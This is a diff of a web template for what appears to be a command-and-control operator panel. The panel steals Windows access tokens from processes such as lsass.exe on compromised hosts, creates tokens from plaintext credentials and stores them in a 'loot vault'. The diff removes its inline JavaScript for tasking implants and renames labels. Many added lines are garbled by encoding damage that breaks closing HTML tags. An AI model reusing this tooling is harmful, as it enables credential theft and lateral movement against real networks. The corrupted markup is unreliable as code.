@@ -11,7 +11,7 @@
         <i class="fa-solid fa-id-badge text-indigo-500 mr-2"></i>Token 模拟中心
       </h1>
       <div class="text-sm text-slate-500 mt-0.5">
-        Agent: <span class="font-medium text-slate-700">{{.Agent.Hostname}}</span>
+        Implant: <span class="font-medium text-slate-700">{{.Agent.Hostname}}</span>
         &nbsp;/&nbsp;
         <span class="font-mono text-xs text-slate-400">{{.Agent.Username}} @ {{.Agent.IP}}</span>
       </div>
@@ -34,7 +34,7 @@
       {{else}}
       <div class="flex items-center gap-2 bg-slate-100 border border-slate-200 rounded-2xl px-4 py-2">
         <span class="w-2.5 h-2.5 bg-slate-400 rounded-full"></span>
-        <span class="text-sm text-slate-500">未模拟（原始令牌）</span>
+        <span class="text-sm text-slate-500">未模拟（原始令牌�?/span>
       </div>
       {{end}}
     </div>
@@ -53,14 +53,14 @@
           </div>
           <div>
             <div class="text-sm font-semibold text-slate-900">枚举进程令牌</div>
-            <div class="text-xs text-slate-400">列出所有进程及其Token所有者</div>
+            <div class="text-xs text-slate-400">列出所有进程及其Token所有�?/div>
           </div>
         </div>
         <button onclick="tokenListProcs('{{.Agent.ID}}')"
                 class="w-full h-10 bg-indigo-600 hover:bg-indigo-700 text-white text-sm font-medium rounded-xl transition-colors">
           <i class="fa-solid fa-search mr-2"></i>枚举令牌
         </button>
-        <div id="proc-list-status" class="mt-2 text-xs text-slate-400 text-center hidden">正在请求，等待 Agent 响应...</div>
+        <div id="proc-list-status" class="mt-2 text-xs text-slate-400 text-center hidden">正在请求，等�?Agent 响应...</div>
       </div>
 
       <!-- 2. Steal Token -->
@@ -71,7 +71,7 @@
           </div>
           <div>
             <div class="text-sm font-semibold text-slate-900">窃取令牌</div>
-            <div class="text-xs text-slate-400">从目标进程复制并模拟其令牌</div>
+            <div class="text-xs text-slate-400">从目标进程复制并模拟其令�?/div>
           </div>
         </div>
         <div class="space-y-2">
@@ -92,7 +92,7 @@
         </div>
         <!-- Quick steal buttons for common high-value processes -->
         <div class="mt-3 pt-3 border-t border-slate-100">
-          <div class="text-xs text-slate-400 mb-2">常见高价值进程（需先枚举获得 PID）</div>
+          <div class="text-xs text-slate-400 mb-2">常见高价值进程（需先枚举获�?PID�?/div>
           <div class="flex flex-wrap gap-1.5">
             <button onclick="quickFillProcName('lsass.exe')"
                     class="px-2.5 py-1 text-xs bg-red-50 hover:bg-red-100 text-red-700 rounded-lg border border-red-200">lsass</button>
@@ -114,12 +114,12 @@
           </div>
           <div>
             <div class="text-sm font-semibold text-slate-900">创建令牌</div>
-            <div class="text-xs text-slate-400">LogonUser — 明文凭据换令牌</div>
+            <div class="text-xs text-slate-400">LogonUser �?明文凭据换令�?/div>
           </div>
         </div>
         <div class="space-y-2">
           <div>
-            <label class="text-xs text-slate-500 mb-1 block">用户名（DOMAIN\user 或 user@domain）</label>
+            <label class="text-xs text-slate-500 mb-1 block">用户名（DOMAIN\user �?user@domain�?/label>
             <input id="make-user" type="text" placeholder="CORP\administrator"
                    class="w-full border border-slate-200 rounded-xl px-3 h-9 text-sm focus:border-indigo-400 focus:outline-none font-mono">
           </div>
@@ -151,7 +151,7 @@
           </div>
           <div>
             <div class="text-sm font-semibold text-slate-900">还原令牌</div>
-            <div class="text-xs text-slate-400">RevertToSelf — 丢弃当前模拟，回到进程令牌</div>
+            <div class="text-xs text-slate-400">RevertToSelf �?丢弃当前模拟，回到进程令�?/div>
           </div>
         </div>
         <div class="flex gap-2">
@@ -176,10 +176,10 @@
         <div class="flex items-center justify-between mb-4">
           <div class="flex items-center gap-2">
             <i class="fa-solid fa-server text-indigo-400"></i>
-            <h2 class="text-sm font-semibold text-slate-900">进程令牌表</h2>
+            <h2 class="text-sm font-semibold text-slate-900">进程令牌�?/h2>
           </div>
           <div class="flex items-center gap-2">
-            <input id="proc-filter" type="text" placeholder="过滤进程名/用户..."
+            <input id="proc-filter" type="text" placeholder="过滤进程�?用户..."
                    class="text-xs border border-slate-200 rounded-xl px-3 h-7 focus:outline-none focus:border-indigo-300 w-40"
                    oninput="filterProcTable(this.value)">
             <button onclick="tokenListProcs('{{.Agent.ID}}')"
@@ -193,15 +193,15 @@
             <thead class="sticky top-0 bg-white">
               <tr class="text-slate-400 border-b border-slate-100">
                 <th class="text-left py-1.5 px-2 w-16">PID</th>
-                <th class="text-left py-1.5 px-2 w-36">进程名</th>
+                <th class="text-left py-1.5 px-2 w-36">进程�?/th>
                 <th class="text-left py-1.5 px-2">令牌用户</th>
-                <th class="text-left py-1.5 px-2 w-24">完整性</th>
+                <th class="text-left py-1.5 px-2 w-24">完整�?/th>
                 <th class="text-left py-1.5 px-2 w-20">操作</th>
               </tr>
             </thead>
             <tbody id="proc-tbody" class="divide-y divide-slate-50 text-slate-700">
               <tr>
-                <td colspan="5" class="text-center py-8 text-slate-400">点击「枚举令牌」加载进程列表</td>
+                <td colspan="5" class="text-center py-8 text-slate-400">点击「枚举令牌」加载进程列�?/td>
               </tr>
             </tbody>
           </table>
@@ -213,8 +213,8 @@
         <div class="flex items-center justify-between mb-4">
           <div class="flex items-center gap-2">
             <i class="fa-solid fa-vault text-amber-500"></i>
-            <h2 class="text-sm font-semibold text-slate-900">令牌战利品库</h2>
-            <span class="text-xs text-slate-400 bg-slate-100 px-2 py-0.5 rounded-full">{{len .Tokens}} 条</span>
+            <h2 class="text-sm font-semibold text-slate-900">令牌保管库</h2>
+            <span class="text-xs text-slate-400 bg-slate-100 px-2 py-0.5 rounded-full">{{len .Tokens}} �?/span>
           </div>
           <button onclick="refreshTokenVault('{{.Agent.ID}}')"
                   class="text-xs px-3 h-7 bg-slate-50 hover:bg-slate-100 text-slate-600 rounded-xl border border-slate-200">
@@ -261,7 +261,7 @@
             <div class="flex items-center gap-1 flex-shrink-0">
               {{if not .Active}}
               <button onclick="tokenReImpersonate('{{$.Agent.ID}}', {{.ID}})"
-                      title="重新模拟此令牌"
+                      title="重新模拟此令�?
                       class="p-1.5 bg-amber-100 hover:bg-amber-200 text-amber-700 rounded-lg transition-colors">
                 <i class="fa-solid fa-play text-xs"></i>
               </button>
@@ -284,7 +284,7 @@
         <div id="token-vault">
           <div class="text-center py-10 text-slate-400 text-sm border-2 border-dashed border-slate-200 rounded-2xl">
             <i class="fa-solid fa-vault text-3xl mb-3 text-slate-300"></i><br>
-            暂无令牌。使用「窃取令牌」或「创建令牌」后，令牌将自动保存至此库。
+            暂无令牌。使用「窃取令牌」或「创建令牌」后，令牌将自动保存至此库�?
           </div>
         </div>
         {{end}}
@@ -308,373 +308,21 @@
 
 <script>
 const agentId = '{{.Agent.ID}}';
-
-// ── Enumerate process tokens ────────────────────────────────────────────────
-function tokenListProcs(id) {
-  setOutput('正在枚举进程令牌，等待 Agent...');
-  document.getElementById('proc-list-status').classList.remove('hidden');
-  fetch(`/agents/${id}/token/list_procs`, { method: 'POST' })
-    .then(r => r.json())
-    .then(d => {
-      if (d.success) {
-        showToast('枚举请求已发送，等待 Agent 响应');
-        // Poll for results
-        startPollingTaskResult(id, d.task_id);
-      } else {
-        setOutput('请求失败: ' + (d.error || '未知错误'));
-      }
-    });
-}
-
-// ── Steal token ─────────────────────────────────────────────────────────────
-function tokenSteal(id) {
-  const pid = document.getElementById('steal-pid').value.trim();
-  const procName = document.getElementById('steal-procname').value.trim();
-  if (!pid) { showToast('请输入目标 PID', 'error'); return; }
-
-  setOutput(`正在向 Agent 发送 steal_token pid=${pid}...`);
-  fetch(`/agents/${id}/token/steal`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: `pid=${encodeURIComponent(pid)}&process_name=${encodeURIComponent(procName)}`
-  })
-  .then(r => r.json())
-  .then(d => {
-    if (d.success) {
-      showToast('Steal Token 已发送，等待结果');
-      startPollingTaskResult(id, d.task_id);
-    } else {
-      setOutput('请求失败: ' + (d.error || ''));
-    }
-  });
-}
-
-// ── Make token ──────────────────────────────────────────────────────────────
-function tokenMake(id) {
-  const user = document.getElementById('make-user').value.trim();
-  const password = document.getElementById('make-password').value;
-  const logonType = document.getElementById('make-logon-type').value;
-  if (!user) { showToast('请输入用户名', 'error'); return; }
-
-  setOutput(`正在创建令牌 ${user} (${logonType})...`);
-  fetch(`/agents/${id}/token/make`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: `user=${encodeURIComponent(user)}&password=${encodeURIComponent(password)}&logon_type=${encodeURIComponent(logonType)}`
-  })
-  .then(r => r.json())
-  .then(d => {
-    if (d.success) {
-      showToast('Make Token 已发送');
-      startPollingTaskResult(id, d.task_id);
-    } else {
-      setOutput('请求失败: ' + (d.error || ''));
-    }
-  });
-}
-
-// ── Rev2Self ────────────────────────────────────────────────────────────────
-function tokenRevert(id) {
-  setOutput('正在发送 RevertToSelf...');
-  fetch(`/agents/${id}/token/revert`, { method: 'POST' })
-    .then(r => r.json())
-    .then(d => {
-      if (d.success) {
-        showToast('Rev2Self 已发送');
-        startPollingTaskResult(id, d.task_id);
-      } else {
-        setOutput('请求失败: ' + (d.error || ''));
-      }
-    });
-}
-
-// ── Token Whoami ────────────────────────────────────────────────────────────
-function tokenWhoami(id) {
-  setOutput('正在查询当前令牌身份...');
-  fetch(`/agents/${id}/token/whoami`, { method: 'POST' })
-    .then(r => r.json())
-    .then(d => {
-      if (d.success) {
-        showToast('Whoami 已发送');
-        startPollingTaskResult(id, d.task_id);
-      } else {
-        setOutput('请求失败: ' + (d.error || ''));
-      }
-    });
-}
-
-// ── Re-impersonate from vault ───────────────────────────────────────────────
-function tokenReImpersonate(id, tokenId) {
-  if (!confirm('重新模拟此令牌？')) return;
-  fetch(`/agents/${id}/token/${tokenId}/impersonate`, { method: 'POST' })
-    .then(r => r.json())
-    .then(d => {
-      if (d.success) {
-        showToast('重新模拟任务已发送');
-        startPollingTaskResult(id, d.task_id);
-      } else {
-        setOutput('请求失败: ' + (d.error || ''));
-      }
-    });
-}
-
-// ── Drop token from vault ───────────────────────────────────────────────────
-function dropToken(id, tokenId, btn) {
-  if (!confirm('确定删除此令牌记录？')) return;
-  fetch(`/agents/${id}/token/${tokenId}`, { method: 'DELETE' })
-    .then(r => r.json())
-    .then(d => {
-      if (d.success) {
-        btn.closest('.token-entry').remove();
-        showToast('令牌已删除');
-      } else {
-        showToast('删除失败: ' + (d.error || ''), 'error');
-      }
-    });
-}
-
-// ── Edit note ───────────────────────────────────────────────────────────────
-function editTokenNote(id, tokenId, currentNote) {
-  const note = prompt('编辑备注:', currentNote || '');
-  if (note === null) return;
-  fetch(`/agents/${id}/token/${tokenId}/note`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: `notes=${encodeURIComponent(note)}`
-  }).then(() => { showToast('备注已更新'); location.reload(); });
-}
-
-// ── Refresh vault ───────────────────────────────────────────────────────────
-function refreshTokenVault(id) {
-  fetch(`/agents/${id}/token/list`)
-    .then(r => r.json())
-    .then(tokens => {
-      renderTokenVault(id, tokens);
-    });
-}
-
-function renderTokenVault(id, tokens) {
-  const vault = document.getElementById('token-vault');
-  if (!vault) return;
-  if (!tokens || tokens.length === 0) {
-    vault.innerHTML = `<div class="text-center py-10 text-slate-400 text-sm border-2 border-dashed border-slate-200 rounded-2xl">
-      <i class="fa-solid fa-vault text-3xl mb-3 text-slate-300"></i><br>暂无令牌
-    </div>`;
-    return;
-  }
-  const integrityClass = (i) => {
-    if (i === 'System') return 'bg-red-100 text-red-700';
-    if (i === 'High') return 'bg-orange-100 text-orange-700';
-    if (i === 'Medium') return 'bg-yellow-100 text-yellow-700';
-    return 'bg-slate-100 text-slate-600';
-  };
-  vault.innerHTML = tokens.map(t => `
-    <div class="token-entry flex items-center gap-3 p-3 rounded-2xl border ${t.active ? 'border-amber-300 bg-amber-50' : 'border-slate-100 bg-slate-50'} transition-colors" data-token-id="${t.id}">
-      <div class="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 ${t.source === 'steal' ? 'bg-amber-500' : 'bg-emerald-500'}">
-        <i class="fa-solid ${t.source === 'steal' ? 'fa-hand-holding' : 'fa-magic'} text-white text-sm"></i>
-      </div>
-      <div class="flex-1 min-w-0">
-        <div class="flex items-center gap-2">
-          <span class="font-semibold text-sm text-slate-900 truncate">${escHtml(t.domain)}\\${escHtml(t.username)}</span>
-          ${t.active ? '<span class="text-[10px] px-1.5 py-0.5 bg-amber-200 text-amber-800 rounded font-medium">活跃</span>' : ''}
-        </div>
-        <div class="flex items-center gap-3 text-xs text-slate-400 mt-0.5">
-          ${t.pid ? `<span><i class="fa-solid fa-microchip mr-1"></i>PID: ${t.pid}</span>` : ''}
-          ${t.process_name ? `<span class="font-mono">${escHtml(t.process_name)}</span>` : ''}
-          <span class="px-1.5 py-px rounded text-[10px] font-medium ${integrityClass(t.integrity)}">${t.integrity || '-'}</span>
-          <span class="text-[10px] text-slate-300">${t.source}</span>
-        </div>
-        ${t.notes ? `<div class="text-xs text-slate-400 italic mt-0.5 truncate">${escHtml(t.notes)}</div>` : ''}
-      </div>
-      <div class="flex items-center gap-1 flex-shrink-0">
-        ${!t.active ? `<button onclick="tokenReImpersonate('${id}', ${t.id})" title="重新模拟" class="p-1.5 bg-amber-100 hover:bg-amber-200 text-amber-700 rounded-lg transition-colors"><i class="fa-solid fa-play text-xs"></i></button>` : ''}
-        <button onclick="editTokenNote('${id}', ${t.id}, '${(t.notes||'').replace(/'/g,"\\'")}' )" class="p-1.5 bg-slate-100 hover:bg-slate-200 text-slate-600 rounded-lg transition-colors"><i class="fa-solid fa-pencil text-xs"></i></button>
-        <button onclick="dropToken('${id}', ${t.id}, this)" class="p-1.5 bg-red-50 hover:bg-red-100 text-red-600 rounded-lg transition-colors"><i class="fa-solid fa-trash text-xs"></i></button>
-      </div>
-    </div>
-  `).join('');
-}
-
-// ── Render process table from JSON ──────────────────────────────────────────
-function renderProcTable(procs) {
-  const tbody = document.getElementById('proc-tbody');
-  if (!procs || procs.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="5" class="text-center py-6 text-slate-400">无数据</td></tr>';
-    return;
-  }
-
-  const intClass = (i) => {
-    if (i === 'System') return 'bg-red-100 text-red-700';
-    if (i === 'High') return 'bg-orange-100 text-orange-700';
-    if (i === 'Medium') return 'bg-yellow-100 text-yellow-700';
-    return 'bg-slate-100 text-slate-600';
-  };
-
-  tbody.innerHTML = procs.map(p => {
-    const user = p.Error ? `<span class="text-slate-300 italic">${p.Error}</span>` : `<span class="text-slate-700">${escHtml(p.Domain)}\\${escHtml(p.Username)}</span>`;
-    const stealBtn = !p.Error ? `<button onclick="fillSteal(${p.PID}, '${(p.ProcessName||'').replace(/'/g,"\\'")}' )"
-      class="px-2 py-0.5 bg-amber-100 hover:bg-amber-200 text-amber-700 rounded text-[10px] font-medium whitespace-nowrap">Steal</button>` : '';
-    return `<tr class="hover:bg-slate-50 proc-row" data-name="${(p.ProcessName||'').toLowerCase()}" data-user="${((p.Domain||'')+'\\\\' +(p.Username||'')).toLowerCase()}">
-      <td class="py-1.5 px-2 font-mono text-indigo-600">${p.PID}</td>
-      <td class="py-1.5 px-2 font-mono text-xs truncate max-w-[8rem]">${escHtml(p.ProcessName)}</td>
-      <td class="py-1.5 px-2">${user}</td>
-      <td class="py-1.5 px-2"><span class="px-1.5 py-px rounded text-[10px] font-medium ${intClass(p.Integrity)}">${p.Integrity || '-'}</span></td>
-      <td class="py-1.5 px-2">${stealBtn}</td>
-    </tr>`;
-  }).join('');
-}
-
-function fillSteal(pid, procName) {
-  document.getElementById('steal-pid').value = pid;
-  document.getElementById('steal-procname').value = procName;
-  document.getElementById('steal-pid').scrollIntoView({behavior:'smooth', block:'center'});
-}
-
-function quickFillProcName(name) {
-  document.getElementById('steal-procname').value = name;
-}
-
-function filterProcTable(query) {
-  const q = query.toLowerCase();
-  document.querySelectorAll('#proc-tbody .proc-row').forEach(row => {
-    const match = !q || row.dataset.name.includes(q) || row.dataset.user.includes(q);
-    row.style.display = match ? '' : 'none';
-  });
-}
-
-// ── Task result polling ──────────────────────────────────────────────────────
-function startPollingTaskResult(agentId, taskId) {
-  let tries = 0;
-  const maxTries = 40; // 40 * 1.5s = 60s timeout
-  const interval = setInterval(() => {
-    tries++;
-    fetch(`/tasks/${taskId}`)
-      .then(r => r.json())
-      .then(data => {
-        if (data.status === 'completed') {
-          clearInterval(interval);
-          handleTaskCompleted(agentId, data);
-        } else if (data.status === 'failed') {
-          clearInterval(interval);
-          setOutput(`[失败] ${data.error || '未知错误'}`);
-          showToast('任务失败: ' + (data.error || ''), 'error');
-        } else if (tries >= maxTries) {
-          clearInterval(interval);
-          setOutput('[超时] Agent 未在60秒内响应，请检查连接');
-        }
-      });
-  }, 1500);
-}
-
-function handleTaskCompleted(agentId, data) {
-  const type = data.type;
-
-  if (type === 'token_list_procs') {
-    // parse proc list and render table
-    try {
-      // result may be base64 encoded JSON
-      let raw = data.result;
-      let procs;
-      try {
-        procs = JSON.parse(atob(raw));
-      } catch(e) {
-        procs = JSON.parse(raw);
-      }
-      renderProcTable(procs);
-      setOutput(`枚举完成，共 ${procs.length} 个进程`);
-      document.getElementById('proc-list-status').classList.add('hidden');
-    } catch(e) {
-      setOutput('进程列表: ' + data.result);
-    }
-  } else if (type === 'token_steal' || type === 'token_make') {
-    try {
-      const m = JSON.parse(data.result);
-      setOutput(
-        `✓ 令牌${type === 'token_steal' ? '窃取' : '创建'}成功\n` +
-        `  用户:  ${m.domain}\\${m.username}\n` +
-        `  完整性: ${m.integrity}\n` +
-        `  当前身份: ${m.whoami}`
-      );
-      showToast(`令牌${type === 'token_steal' ? '窃取' : '创建'}成功: ${m.domain}\\${m.username}`);
-      // refresh vault
-      setTimeout(() => refreshTokenVault(agentId), 800);
-      // update header badge
-      updateImpersonationBadge(m.domain, m.username, m.integrity);
-    } catch(e) {
-      setOutput(data.result);
-    }
-  } else if (type === 'token_revert' || type === 'rev2self') {
-    try {
-      const m = JSON.parse(data.result);
-      setOutput(`✓ RevertToSelf 成功\n  恢复身份: ${m.whoami}`);
-      showToast('已还原至原始令牌');
-      clearImpersonationBadge();
-      setTimeout(() => refreshTokenVault(agentId), 800);
-    } catch(e) {
-      setOutput(data.result);
-    }
-  } else if (type === 'token_whoami') {
-    try {
-      const m = JSON.parse(data.result);
-      setOutput(`当前身份: ${m.whoami}`);
-    } catch(e) {
-      setOutput(data.result);
-    }
-  } else {
-    setOutput(data.result || data.error || '(空)');
-  }
-}
-
-function updateImpersonationBadge(domain, username, integrity) {
-  const badge = document.getElementById('impersonation-badge');
-  badge.innerHTML = `
-    <div class="flex items-center gap-2 bg-amber-100 border border-amber-300 rounded-2xl px-4 py-2">
-      <span class="w-2.5 h-2.5 bg-amber-500 rounded-full animate-pulse"></span>
-      <span class="text-sm font-semibold text-amber-700">
-        <i class="fa-solid fa-user-secret mr-1"></i>
-        正在模拟: ${escHtml(domain)}\\${escHtml(username)}
-      </span>
-      <span class="text-xs text-amber-600 ml-1">(${integrity})</span>
-      <button onclick="tokenRevert('${agentId}')"
-              class="ml-2 px-2.5 py-1 bg-amber-500 hover:bg-amber-600 text-white text-xs rounded-xl transition-colors">
-        <i class="fa-solid fa-sign-out-alt mr-1"></i>Rev2Self
-      </button>
-    </div>`;
-}
-
-function clearImpersonationBadge() {
-  const badge = document.getElementById('impersonation-badge');
-  badge.innerHTML = `
-    <div class="flex items-center gap-2 bg-slate-100 border border-slate-200 rounded-2xl px-4 py-2">
-      <span class="w-2.5 h-2.5 bg-slate-400 rounded-full"></span>
-      <span class="text-sm text-slate-500">未模拟（原始令牌）</span>
-    </div>`;
-}
-
-function setOutput(text) {
-  const el = document.getElementById('token-output');
-  el.textContent = text;
-}
-
-function escHtml(s) {
-  if (!s) return '';
-  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-}
 </script>
+<script src="/static/js/token.js"></script>
 {{end}}
-
 
 {{define "tokens_global_content"}}
 <div class="max-w-7xl mx-auto space-y-6">
   <div class="flex items-center justify-between">
     <div>
       <h1 class="text-2xl font-semibold text-slate-900">
-        <i class="fa-solid fa-vault text-amber-500 mr-2"></i>Token 战利品库（全局）
+        <i class="fa-solid fa-vault text-amber-500 mr-2"></i>Token 保管库（全局�?
       </h1>
-      <div class="text-sm text-slate-500 mt-0.5">所有 Agent 窃取的令牌汇总</div>
+      <div class="text-sm text-slate-500 mt-0.5">所�?Agent 窃取的令牌汇�?/div>
     </div>
     <div class="text-sm text-slate-500 bg-white border border-slate-200 rounded-2xl px-4 py-2">
-      共 <span class="font-semibold text-slate-900">{{len .Tokens}}</span> 条令牌
+      �?<span class="font-semibold text-slate-900">{{len .Tokens}}</span> 条令�?
     </div>
   </div>
 
@@ -683,12 +331,12 @@ function escHtml(s) {
     <table class="w-full text-sm">
       <thead class="bg-slate-50 border-b border-slate-200">
         <tr class="text-slate-500 text-xs">
-          <th class="text-left px-5 py-3">Agent</th>
+          <th class="text-left px-5 py-3">Implant</th>
           <th class="text-left px-4 py-3">令牌用户</th>
-          <th class="text-left px-4 py-3">完整性</th>
+          <th class="text-left px-4 py-3">完整�?/th>
           <th class="text-left px-4 py-3">来源</th>
           <th class="text-left px-4 py-3">进程</th>
-          <th class="text-left px-4 py-3">状态</th>
+          <th class="text-left px-4 py-3">状�?/th>
           <th class="text-left px-4 py-3">时间</th>
           <th class="text-left px-4 py-3">操作</th>
         </tr>
@@ -727,7 +375,7 @@ function escHtml(s) {
               <span class="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></span> 活跃
             </span>
             {{else}}
-            <span class="text-xs text-slate-400">已失活</span>
+            <span class="text-xs text-slate-400">已失�?/span>
             {{end}}
           </td>
           <td class="px-4 py-3 text-xs font-mono text-slate-400">{{.CreatedAt | formatTime}}</td>
@@ -745,8 +393,8 @@ function escHtml(s) {
   {{else}}
   <div class="text-center py-20 text-slate-400">
     <i class="fa-solid fa-vault text-5xl mb-4 text-slate-300"></i>
-    <div class="text-lg font-medium">战利品库为空</div>
-    <div class="text-sm mt-1">进入 Agent 的 Token 模拟中心，窃取令牌后将自动汇总于此</div>
+    <div class="text-lg font-medium">令牌库为空</div>
+    <div class="text-sm mt-1">进入 Agent �?Token 模拟中心，窃取令牌后将自动汇总于�?/div>
   </div>
   {{end}}
 </div>
